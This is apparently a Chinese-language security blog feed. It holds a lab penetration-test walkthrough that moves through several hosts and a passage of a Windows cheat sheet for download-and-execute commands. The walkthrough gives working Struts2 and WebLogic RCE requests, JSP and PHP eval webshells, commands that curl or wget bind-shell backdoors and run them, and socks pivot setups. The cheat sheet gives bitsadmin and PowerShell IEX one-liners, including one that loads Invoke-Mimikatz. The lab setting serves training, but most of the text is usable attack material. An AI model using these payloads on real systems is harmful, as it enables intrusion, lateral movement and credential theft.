href="http://172.26.2.174/admin/">http://172.26.2.174/admin/</a></p></blockquote></blockquote><p>由于没有用户名枚举漏洞 尝试用户名和密码一起爆破</p><p>配置burp代理</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359195.png" alt="image-20220920135901042" style="zoom:50%;" /><p>配置爆破模块</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359813.png" alt="image-20220920135918633" style="zoom:50%;" /><p>得到用户名和密码为admin&#x2F;admin123456</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359619.png" alt="image-20220920135931432" style="zoom:50%;" /><p>进入后台getshell。在系统中修改语言模板getshell。存在这种漏洞，笑开花。</p><blockquote><p>如果如果不存在这种傻x式的漏洞，就要去查找cms对应的历史漏洞，再次就是自己挖了，orz</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359835.png" alt="image-20220920135946607" style="zoom:50%;" /><p>蚁剑配置代理连接 shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.26.2.174/public/languages/Chinese.php  pwd</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201400267.png" alt="image-20220920140009057" style="zoom:50%;" /><p>存在3网段建立二层socks代理</p><h2 id="二层socks代理"><a href="#二层socks代理" class="headerlink" title="二层socks代理"></a>二层socks代理</h2><ol><li>EW</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#VPS:</span></span><br><span class="line">./ew_vps -s lcx_listen -l 6003 -e 6002</span><br><span class="line"><span class="comment">#HongCMS：</span></span><br><span class="line">ew.exe -s ssocksd -l 9999</span><br><span class="line"><span class="comment">#ThinkPHP：</span></span><br><span class="line">ew1 -s lcx_slave -d 47.101.214.85 -e 6002 -f 172.26.2.174 -g 9999</span><br></pre></td></tr></table></figure><ol start="2"><li>FRP</li></ol><ul><li>vps</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = xx.xx.xx.xx</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Thinkphp</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. frpc.exe -c frpc_1.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br><span class="line"></span><br><span class="line">[socks5_to_3]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">## 需要被代理的本地服务的 IP 地址</span></span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">## 配合 local_ip</span></span><br><span class="line">local_port = 8001</span><br><span class="line"></span><br><span class="line"><span class="comment">## 用户访问此端口的请求会被转发到 local_ip:local_port</span></span><br><span class="line">remote_port = 8002</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>HongCMS</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_2.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.2.182</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_3]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8001</span><br></pre></td></tr></table></figure><h2 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#扫描存活主机[3网段]</span></span><br><span class="line"><span class="comment">## ping</span></span><br><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @ ping 172.26.3.%i -w 1 -n 1|find /i <span class="string">&quot;ttl=&quot;</span></span><br><span class="line"><span class="comment">## ladon</span></span><br><span class="line">ladon.exe 172.26.3.0/24 OnlinePC</span><br><span class="line">ladon.exe 172.26.3.0/24 portscan</span><br><span class="line"><span class="comment">## nmap</span></span><br><span class="line">proxychains nmap -sT -Pn -T4 172.26.3.0/24</span><br><span class="line"><span class="comment">## arp -a</span></span><br></pre></td></tr></table></figure><h1 id="3-x网段渗透-172-26-3-75-centos-struts2"><a href="#3-x网段渗透-172-26-3-75-centos-struts2" class="headerlink" title="3.x网段渗透 - 172.26.3.75[centos-struts2]"></a>3.x网段渗透 - 172.26.3.75[centos-struts2]</h1><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>struts2-rce</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成后门,上传到hongcms[172.26.2.174/172.26.3.18]web服务目录中,后面再在poc中远程下载即可，然后getshell</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">poc:</span></span><br><span class="line">POST /orders/3 HTTP/1.1</span><br><span class="line">Host: 172.26.3.75:8080</span><br><span class="line">Content-Length: 2430</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://172.26.3.75:8080</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://172.26.3.75:8080/orders/3/edit</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,la;q=0.8,en;q=0.7</span><br><span class="line">Cookie: JSESSIONID=FB20F1713775958840CAAA6C8703CC5F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">            &lt;command&gt;</span><br><span class="line">                       &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                       &lt;string&gt;curl -o /tmp/bind7777.elf http://172.26.3.18/bind7777.elf&lt;/string&gt;</span><br><span class="line">            &lt;/command&gt;</span><br><span class="line">                      </span><br><span class="line">&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      </span><br><span class="line">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改<span class="built_in">command</span></span></span><br><span class="line">&lt;command&gt;</span><br><span class="line">            &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;chmod +x /tmp/bind7777.elf&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改<span class="built_in">command</span></span></span><br><span class="line">&lt;command&gt;</span><br><span class="line">            &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;./tmp/bind7777.elf&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>ssh登录</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root/hacking@hetian</span><br></pre></td></tr></table></figure><ol start="3"><li>msf的s2-045模块</li></ol><p>msf自带struts2历史漏洞利用模块</p><h2 id="MSF连接上线"><a href="#MSF连接上线" class="headerlink" title="MSF连接上线"></a>MSF连接上线</h2><p>meterpreter后渗透 [无其他网段]</p><h2 id="struts2漏洞利用工具"><a href="#struts2漏洞利用工具" class="headerlink" title="struts2漏洞利用工具"></a>struts2漏洞利用工具</h2><p>通过proxychains将struts2漏洞利用工具代理进内网扫描</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211552045.png" alt="image-20220921155257805" style="zoom:50%;" /><h1 id="3-x网段渗透-172-26-3-27-centos-weblogic"><a href="#3-x网段渗透-172-26-3-27-centos-weblogic" class="headerlink" title="3.x网段渗透 - 172.26.3.27[centos-weblogic]"></a>3.x网段渗透 - 172.26.3.27[centos-weblogic]</h1><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>weblogic-poc</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上马poc[利用方法、工具多样，这里只列举一种]</span></span><br><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 172.26.3.27:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1112</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.xmlDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[</span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[1024];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    %&gt;]]&gt;</span><br><span class="line">&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问马</span></span><br><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=ls</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成后门，上传到HongCMS[172.26.2.174/172.26.3.18]web服务目录中</span></span><br><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=wget%20http://172.26.3.18/bind7778.elf</span><br></pre></td></tr></table></figure><ol start="2"><li>weblogic漏洞利用工具</li></ol><blockquote><p>weblogic scan扫一扫有莫有历史漏洞，再利用即可</p></blockquote><ol start="3"><li>msf的weblogic利用模块</li></ol><blockquote><p>msf也有利用模块 search即可</p></blockquote><h2 id="执行后门，msf连接上线"><a href="#执行后门，msf连接上线" class="headerlink" title="执行后门，msf连接上线"></a>执行后门，msf连接上线</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=./bind7778.elf</span><br></pre></td></tr></table></figure><h2 id="后渗透-可以发现4网段"><a href="#后渗透-可以发现4网段" class="headerlink" title="后渗透 [可以发现4网段]"></a>后渗透 [可以发现4网段]</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"><span class="comment">#扫描存活主机[4网段]</span></span><br><span class="line"><span class="comment">#ping.sh[需要在linux上进行编辑]</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> &#123;1..254&#125;;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ip=172.26.4.<span class="variable">$num</span></span><br><span class="line">    ping -c1 <span class="variable">$ip</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [ $? = 0 ];</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> ok</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> fail</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="添加路由、设置三层代理"><a href="#添加路由、设置三层代理" class="headerlink" title="添加路由、设置三层代理"></a>添加路由、设置三层代理</h2><ol><li>msf添加路由</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.26.4.0/24</span><br></pre></td></tr></table></figure><ol start="2"><li>ew三层代理</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#vps  ./ew_for_linux64 -s rcsocks -l 10078 -e 6699</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将Vps6699与HongCms的7778端口绑定建立socks5代理</span></span><br><span class="line">Thinkphp ./ew1 -s lcx_slave -d 119.45.175.218 -e 6699 -f 172.26.2.174 -g 7778</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地启动流量转发，将来自外部7778端口的流量转发到本地的10011端口</span></span><br><span class="line">HongCms ew2.exe -s lcx_listen -l 7778 -e 10011</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动socks5服务，并反弹到HongCms的10011端口</span></span><br><span class="line">weblogic ./ew3 -s rssocks -d 172.26.3.18 -e 10011</span><br></pre></td></tr></table></figure><ol start="3"><li>frp三层代理</li></ol><ul><li>VPS</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 47.101.214.85</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Thinkphp</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br><span class="line"></span><br><span class="line">[socks5_to_3]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6002</span><br><span class="line">remote_port = 6003</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6004</span><br><span class="line">remote_port = 6005</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>HongCMS</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. frpc -c frpc_3.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.2.182</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_3]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6002</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6006</span><br><span class="line">remote_port = 6004</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Weblogic</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_4.ini</span><br><span class="line">frpc -c frpc_4.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.3.18</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6006</span><br></pre></td></tr></table></figure><h1 id="4-x网段渗透-172-26-4-22-win7-thinkcmf"><a href="#4-x网段渗透-172-26-4-22-win7-thinkcmf" class="headerlink" title="4.x网段渗透-172.26.4.22 [win7-thinkcmf]"></a>4.x网段渗透-172.26.4.22 [win7-thinkcmf]</h1><h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>thinkcmf任意文件写入</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入phpinfo[这里可以直接在172.26.3.78 weblogic靶机上直接使用curl访问，也可以连接代理通过浏览器访问]</span></span><br><span class="line">curl &quot;http://172.26.4.22/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27test.php%27,%27%3C?php%20phpinfo();?%3E%27)%3C/php%3E&quot;</span><br><span class="line"></span><br><span class="line">http://172.26.4.22/index.php?a=display&amp;templateFile=test.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入马</span></span><br><span class="line">curl &quot;http://172.26.4.22/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27mingy.php%27,%27%3C?php%20@eval(\$_POST[ccc]);?%3E%27)%3C/php%3E&quot;</span><br><span class="line"></span><br><span class="line">http://172.26.4.22/index.php?a=display&amp;templateFile=mingy.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">菜刀代理连接马</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成bind_tcp后门，并通过webshell上传运行，msf连接上线</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211606777.png" alt="image-20220921160624554" style="zoom:50%;" /><ol start="2"><li>ms17-010</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows命令行下载文件</title>
      <link href="/%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="windows命令行下载文件"><a href="#windows命令行下载文件" class="headerlink" title="windows命令行下载文件"></a>windows命令行下载文件</h1><p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p><p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式<strong>。</strong>另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p><blockquote><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/bdf67ffe0b21">https://www.jianshu.com/p/bdf67ffe0b21</a></li><li><a href="https://www.cnblogs.com/liujunjun/p/14718354.html">https://www.cnblogs.com/liujunjun/p/14718354.html</a></li><li><a href="https://xz.aliyun.com/t/1654#toc-6">https://xz.aliyun.com/t/1654#toc-6</a></li><li><a href="https://xz.aliyun.com/t/1654/">https://xz.aliyun.com/t/1654/</a></li><li><a href="https://evi1cg.me/archives/remote_exec.html">https://evi1cg.me/archives/remote_exec.html</a></li><li><a href="https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A">https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A</a></li><li><a href="https://www.cnblogs.com/17bdw/p/8550189.html">Windows执行命令与下载文件总结 </a></li><li><a href="https://www.jianshu.com/p/e8f65deac245">在windows上执行恶意代码 by rundll32 &amp; regsvr32</a></li><li><a href="https://www.codercto.com/a/104908.html">IEexec.exe执行payload</a></li><li><a href="https://www.cnblogs.com/backlion/p/10488747.html">rundll32.exe 多种方法绕过白名单</a></li></ul></blockquote><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。只能命令下载到指定路径上，适用win7以上。适用于windows 7以上版本。 详情参考：</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/bits/bitsadmin-tool?redirectedfrom=MSDN">https://learn.microsoft.com/zh-cn/windows/win32/bits/bitsadmin-tool?redirectedfrom=MSDN</a></p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal <span class="string">&quot;http://192.168.203.140/b.ps1&quot;</span> <span class="string">&quot;E:\\phpstudy_pro\\WWW\\b.ps1&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal <span class="string">&quot;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&quot;</span> <span class="string">&quot;d:\abc.jpg&quot;</span></span><br><span class="line">bitsadmin /transfer d90f &lt;http://site.com/a&gt; %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;<span class="built_in">del</span> %APPDATA%\d90f.exe</span><br></pre></td></tr></table></figure><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>适用于windows 7以上版本。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程执行命令：</span></span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程下载文件保存在本地：</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.203.140/a.ps1&#x27;</span>,<span class="string">&#x27;E:\phpstudy_pro\WWW\a.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;&lt;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&gt;&#x27;</span>); <span class="built_in">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-exec</span> bypass <span class="operator">-f</span> \\webdavserver\folder\payload.ps1</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile( <span class="string">&#x27;http://192.168.168.183/1.exe’,’C:\111111111111111.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> (<span class="built_in">new-object</span> System.Net.WebClient).Downloadfile(<span class="string">&#x27;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&#x27;</span>,<span class="string">&#x27;d:\\1.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h2><p>适用于server 2003 以上版本。 </p><p>第一种把下载地址直接echo输入download.vbs。直接下载即可。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> Post = CreateObject(<span 